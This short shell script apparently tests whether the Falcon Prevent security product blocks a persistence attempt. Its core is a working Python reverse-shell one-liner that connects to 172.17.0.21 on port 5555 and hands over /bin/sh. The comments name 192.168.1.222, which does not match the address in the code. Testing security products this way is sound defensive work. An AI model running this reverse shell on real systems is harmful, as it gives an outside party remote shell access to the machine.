#!/bin/sh
# Shortname: remote_service_persistence
# Description: Attempts to create persistence to 192.168.1.222 via External Remote Services via Python script. Falcon Prevent will kill the attempt.

echo -e "\e[92mExecuting Persistence via External Remote Services via Python script. This script will try creating persistence to 192.168.1.222. A Falcon Prevent action can kill the attempt."
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.21",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-"]);'
